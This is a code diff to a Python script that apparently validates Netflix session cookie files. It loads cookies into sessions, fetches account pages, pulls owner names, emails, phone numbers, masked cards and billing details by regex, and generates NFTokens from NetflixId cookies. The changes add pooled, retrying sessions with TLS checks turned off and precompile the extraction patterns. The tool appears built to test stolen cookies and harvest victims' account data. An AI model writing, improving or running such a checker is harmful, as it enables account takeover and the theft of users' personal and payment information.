@@ -3,13 +3,73 @@ import re
 import requests
 import json
 import unicodedata
+import threading
 from collections import OrderedDict
 from datetime import datetime
 from typing import Optional, Dict, Any, Tuple
-
 from urllib3.exceptions import InsecureRequestWarning
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
 
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+_thread_local = threading.local()
+
+def _get_session() -> requests.Session:
+    if not hasattr(_thread_local, 'session'):
+        session = requests.Session()
+        adapter = HTTPAdapter(
+            pool_connections=20,
+            pool_maxsize=20,
+            max_retries=Retry(total=2, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
+        )
+        session.mount('https://', adapter)
+        session.mount('http://', adapter)
+        session.verify = False
+        session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept-Encoding': 'gzip, deflate',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Connection': 'keep-alive',
+        })
+        _thread_local.session = session
+    return _thread_local.session
+
+RE_PATTERNS = {
+    'userInfo_name': re.compile(r'userInfo"\s*:\s*\{\s*"name"\s*:\s*"([^"]+)"'),
+    'accountOwnerName': re.compile(r'"accountOwnerName"\s*:\s*"([^"]+)"'),
+    'emailAddress': re.compile(r'"emailAddress"\s*:\s*"([^"]+)"'),
+    'email': re.compile(r'"email"\s*:\s*"([^"]+)"'),
+    'currentCountry': re.compile(r'"currentCountry"\s*:\s*"([^"]+)"'),
+    'countryOfSignup': re.compile(r'"countryOfSignup":\s*"([^"]+)"'),
+    'memberSince': re.compile(r'"memberSince":\s*"([^"]+)"'),
+    'nextBillingDate_alt': re.compile(r'"GrowthNextBillingDate"\s*,\s*"date"\s*:\s*"([^"T]+)T'),
+    'nextBillingDate': re.compile(r'"nextBillingDate"\s*:\s*"([^"]+)"'),
+    'userGuid': re.compile(r'"userGuid":\s*"([^"]+)"'),
+    'membershipStatus': re.compile(r'"membershipStatus":\s*"([^"]+)"'),
+    'localizedPlanName': re.compile(r'localizedPlanName\":\{\"fieldType\":\"String\",\"value\":\"([^"]+)"'),
+    'currentPlan_name': re.compile(r'"currentPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"'),
+    'formattedPlanPrice': re.compile(r'"formattedPlanPrice"\s*:\s*"([^"]+)"'),
+    'formattedPrice': re.compile(r'"formattedPrice"\s*:\s*"([^"]+)"'),
+    'paymentMethod': re.compile(r'"paymentMethod"\s*:\s*"([^"]+)"'),
+    'paymentCardDisplayString': re.compile(r'"paymentCardDisplayString"\s*:\s*"([^"]+)"'),
+    'maskedCard': re.compile(r'"maskedCard"\s*:\s*"([^"]+)"'),
+    'phoneNumberDigits': re.compile(r'"phoneNumberDigits"\s*:\s*\{[\s\S]*?"value"\s*:\s*"([^"]+)"'),
+    'phoneNumber': re.compile(r'"phoneNumber"\s*:\s*"([^"]+)"'),
+    'phoneVerified': re.compile(r'"phoneVerified"\s*:\s*(true|false)'),
+    'videoQuality_field': re.compile(r'videoQuality"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"'),
+    'videoQuality': re.compile(r'"videoQuality"\s*:\s*"([^"]+)"'),
+    'holdStatus': re.compile(r'"holdStatus"\s*:\s*(true|false)'),
+    'isUserOnHold': re.compile(r'"isUserOnHold"\s*:\s*(true|false)'),
+    'emailVerified': re.compile(r'"emailVerified"\s*:\s*(true|false)'),
+    'maxStreams_field': re.compile(r'maxStreams\":\{\"fieldType\":\"Numeric\",\"value\":([^,]+),'),
+    'maxStreams': re.compile(r'"maxStreams"\s*:\s*"?([^",]+)"?'),
+    'profileName': re.compile(r'"profileName"\s*:\s*"([^"]+)"'),
+    'profileName_field': re.compile(r'"profileName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"'),
+    'profile_typename': re.compile(r'"__typename"\s*:\s*"Profile"'),
+    'profile_name': re.compile(r'"name"\s*:\s*"([^"]+)"'),
+}
 
 NETFLIX_COOKIE_NAMES = {
     'thx_guid', 'tmx_guid', 'nfvdid', 'NetflixId',
@@ -136,6 +196,7 @@ _COUNTRY_CODE_TO_NAME = {
     "UA": "Ukraine",
 }
 
+
 def decode_netflix_value(value):
     if value is None:
         return None
@@ -161,11 +222,10 @@ def decode_netflix_value(value):
     cleaned = re.sub(r"\s+", " ", cleaned).strip()
     return cleaned or None
 
-def extract_first_match(response_text, patterns, flags=0):
-    for pattern in patterns:
-        match = re.search(pattern, response_text, flags)
-        if match:
-            return decode_netflix_value(match.group(1))
+def extract_first_match(response_text, pattern):
+    match = pattern.search(response_text)
+    if match:
+        return decode_netflix_value(match.group(1))
     return None
 
 def parse_boolean_value(value):
@@ -348,17 +408,14 @@ def is_on_hold_account(info):
 
 def extract_profile_names(response_text):
     names = []
-    for pattern in [
-        r'"profileName"\s*:\s*"([^"]+)"',
-        r'"profileName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
-    ]:
-        for found in re.findall(pattern, response_text, re.DOTALL):
+    for pattern in (RE_PATTERNS['profileName'], RE_PATTERNS['profileName_field']):
+        for found in pattern.findall(response_text):
             decoded = decode_netflix_value(found)
             if decoded and decoded not in names:
                 names.append(decoded)
-    for match in re.finditer(r'"__typename"\s*:\s*"Profile"', response_text):
+    for match in RE_PATTERNS['profile_typename'].finditer(response_text):
         snippet = response_text[match.start():match.start() + 1200]
-        name_match = re.search(r'"name"\s*:\s*"([^"]+)"', snippet)
+        name_match = RE_PATTERNS['profile_name'].search(snippet)
         if name_match:
             decoded = decode_netflix_value(name_match.group(1))
             if decoded and decoded not in names:
@@ -492,23 +549,23 @@ def extract_info_from_graphql_payload(response_text):
 def extract_info(response_text):
     graphql_info = extract_info_from_graphql_payload(response_text)
     fallback = {
-        "accountOwnerName": extract_first_match(response_text, [r'userInfo"\s*:\s*\{\s*"name"\s*:\s*"([^"]+)"', r'"accountOwnerName"\s*:\s*"([^"]+)"']),
-        "email": extract_first_match(response_text, [r'"emailAddress"\s*:\s*"([^"]+)"', r'"email"\s*:\s*"([^"]+)"']),
-        "countryOfSignup": extract_first_match(response_text, [r'"currentCountry"\s*:\s*"([^"]+)"', r'"countryOfSignup":\s*"([^"]+)"']),
-        "memberSince": extract_first_match(response_text, [r'"memberSince":\s*"([^"]+)"']),
-        "nextBillingDate": extract_first_match(response_text, [r'"GrowthNextBillingDate"\s*,\s*"date"\s*:\s*"([^"T]+)T', r'"nextBillingDate"\s*:\s*"([^"]+)"']),
-        "userGuid": extract_first_match(response_text, [r'"userGuid":\s*"([^"]+)"']),
-        "membershipStatus": extract_first_match(response_text, [r'"membershipStatus":\s*"([^"]+)"']),
-        "localizedPlanName": extract_first_match(response_text, [r'localizedPlanName\":\{\"fieldType\":\"String\",\"value\":\"([^"]+)"', r'"currentPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"']),
-        "planPrice": extract_first_match(response_text, [r'"formattedPlanPrice"\s*:\s*"([^"]+)"', r'"formattedPrice"\s*:\s*"([^"]+)"']),
-        "paymentMethodType": extract_first_match(response_text, [r'"paymentMethod"\s*:\s*"([^"]+)"']),
-        "maskedCard": extract_first_match(response_text, [r'"paymentCardDisplayString"\s*:\s*"([^"]+)"', r'"maskedCard"\s*:\s*"([^"]+)"']),
-        "phoneNumber": extract_first_match(response_text, [r'"phoneNumberDigits"\s*:\s*\{[\s\S]*?"value"\s*:\s*"([^"]+)"', r'"phoneNumber"\s*:\s*"([^"]+)"']),
-        "phoneVerified": extract_first_match(response_text, [r'"phoneVerified"\s*:\s*(true|false)']),
-        "videoQuality": extract_first_match(response_text, [r'videoQuality"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"', r'"videoQuality"\s*:\s*"([^"]+)"']),
-        "holdStatus": extract_first_match(response_text, [r'"holdStatus"\s*:\s*(true|false)', r'"isUserOnHold"\s*:\s*(true|false)']),
-        "emailVerified": extract_first_match(response_text, [r'"emailVerified"\s*:\s*(true|false)']),
-        "maxStreams": extract_first_match(response_text, [r'maxStreams\":\{\"fieldType\":\"Numeric\",\"value\":([^,]+),', r'"maxStreams"\s*:\s*"?([^",]+)"?']),
+        "accountOwnerName": extract_first_match(response_text, RE_PATTERNS['userInfo_name']) or extract_first_match(response_text, RE_PATTERNS['accountOwnerName']),
+        "email": extract_first_match(response_text, RE_PATTERNS['emailAddress']) or extract_first_match(response_text, RE_PATTERNS['email']),
+        "countryOfSignup": extract_first_match(response_text, RE_PATTERNS['currentCountry']) or extract_first_match(response_text, RE_PATTERNS['countryOfSignup']),
+        "memberSince": extract_first_match(response_text, RE_PATTERNS['memberSince']),
+        "nextBillingDate": extract_first_match(response_text, RE_PATTERNS['nextBillingDate_alt']) or extract_first_match(response_text, RE_PATTERNS['nextBillingDate']),
+        "userGuid": extract_first_match(response_text, RE_PATTERNS['userGuid']),
+        "membershipStatus": extract_first_match(response_text, RE_PATTERNS['membershipStatus']),
+        "localizedPlanName": extract_first_match(response_text, RE_PATTERNS['localizedPlanName']) or extract_first_match(response_text, RE_PATTERNS['currentPlan_name']),
+        "planPrice": extract_first_match(response_text, RE_PATTERNS['formattedPlanPrice']) or extract_first_match(response_text, RE_PATTERNS['formattedPrice']),
+        "paymentMethodType": extract_first_match(response_text, RE_PATTERNS['paymentMethod']),
+        "maskedCard": extract_first_match(response_text, RE_PATTERNS['paymentCardDisplayString']) or extract_first_match(response_text, RE_PATTERNS['maskedCard']),
+        "phoneNumber": extract_first_match(response_text, RE_PATTERNS['phoneNumberDigits']) or extract_first_match(response_text, RE_PATTERNS['phoneNumber']),
+        "phoneVerified": extract_first_match(response_text, RE_PATTERNS['phoneVerified']),
+        "videoQuality": extract_first_match(response_text, RE_PATTERNS['videoQuality_field']) or extract_first_match(response_text, RE_PATTERNS['videoQuality']),
+        "holdStatus": extract_first_match(response_text, RE_PATTERNS['holdStatus']) or extract_first_match(response_text, RE_PATTERNS['isUserOnHold']),
+        "emailVerified": extract_first_match(response_text, RE_PATTERNS['emailVerified']),
+        "maxStreams": extract_first_match(response_text, RE_PATTERNS['maxStreams_field']) or extract_first_match(response_text, RE_PATTERNS['maxStreams']),
         "profiles": extract_profile_names(response_text),
     }
     merged = dict(fallback)
@@ -518,7 +575,7 @@ def extract_info(response_text):
             merged[bool_field] = format_boolean_label(merged[bool_field])
     return merged
 
-def get_account_page(session, proxy=None, timeout=20):
+def get_account_page(session, proxy=None, timeout=30):
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Accept-Encoding": "identity",
@@ -597,10 +654,11 @@ def create_nftoken(cookie_dict, attempts=3, proxy=None):
 
     headers = NFTOKEN_HEADERS.copy()
     headers["Cookie"] = f"NetflixId={netflix_id}"
+    session = _get_session()
 
     for _ in range(attempts):
         try:
-            response = requests.get(
+            response = session.get(
                 NFTOKEN_API_URL,
                 params=NFTOKEN_QUERY_PARAMS,
                 headers=headers,
@@ -691,7 +749,7 @@ def check_cookie_file(file_path: str, device: str = "pc") -> Tuple[Optional[str]
     if not cookies_dict or 'NetflixId' not in cookies_dict:
         return None, None
 
-    session = requests.Session()
+    session = _get_session()
     for name, value in cookies_dict.items():
         session.cookies.set(name, value, domain='.netflix.com', path='/')
 
